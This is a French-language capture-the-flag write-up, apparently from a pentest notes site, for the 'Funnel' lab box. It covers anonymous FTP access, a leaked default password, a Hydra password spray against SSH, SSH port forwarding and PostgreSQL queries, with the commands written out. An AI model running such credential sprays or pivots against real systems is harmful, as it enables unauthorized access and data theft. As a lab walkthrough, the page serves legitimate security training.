---
sidebar_position: 4
title: "SSH → DB interne"
---

# Scenario : SSH vers base de donnees interne

**Box** : `Funnel`
**Chaine** : FTP anonyme → credentials → Hydra SSH → port forwarding → PostgreSQL

## Resume

```
FTP (port 21)           SSH (port 22)           PostgreSQL (local:5432)
    │                       │                        │
    ├── anonymous           │                        │
    ├── get email.eml       │                        │
    ├── get policy.pdf      ���                        │
    │   → password par      │                        │
    │     defaut deduuit    │                        │
    │                       │                        │
    └── Hydra spray ──────→├── christine login       │
                            ├── ss -tl → 5432        ���
                            ├── SSH -L 1234:...  ───→├── psql connexion
                            │                        ├── \l → bases
                            │                        ├── SELECT * FROM flag
                            │                        └── FLAG
```

## Etapes

### 1. Reconnaissance

- nmap revele **port 21 (FTP)** et **port 22 (SSH)**

### 2. Enumeration FTP

- Connexion anonyme → 2 fichiers :
  - `mail_from_john.eml` → email mentionnant des nouveaux employes
  - `password_policy.pdf` → le mot de passe par defaut est `funnel123#!#`

### 3. Password spray SSH

- Creer une liste d'utilisateurs a partir des noms mentionnes
- Hydra : `hydra -L usernames.txt -p 'funnel123#!#' <IP> ssh`
- Resultat : `christine` n'a pas change son mot de passe

### 4. Enumeration post-connexion

- `ss -tl` → PostgreSQL ecoute sur **localhost:5432**
- Ce service n'est pas accessible de l'exterieur

### 5. Port forwarding

- `ssh -L 1234:localhost:5432 christine@<IP>`
- Depuis un autre terminal : `psql -U christine -h localhost -p 1234`

### 6. Extraction

- `\l` → lister les bases → trouver la base cible
- `\connect <db>` → `\dt` → `SELECT * FROM flag;`

## Lecon

**Ne jamais s'arreter au premier acces.** Apres une connexion SSH, toujours verifier les services locaux avec `ss -tl`. Le vrai tresor est souvent un service cache derriere un port forwarding.

## Liens

- [Methodologie - Port 21 FTP](../02-enumeration/port-21-ftp.md)
- [Methodologie - Port 22 SSH](../02-enumeration/port-22-ssh.md)
- [Cheatsheet - Hydra](/docs/cheatsheet/exploitation/brute-force)
- [Cheatsheet - Pivoting](/docs/cheatsheet/post-exploitation/pivoting)
- [Cheatsheet - Bases de donnees](/docs/cheatsheet/enumeration/databases)
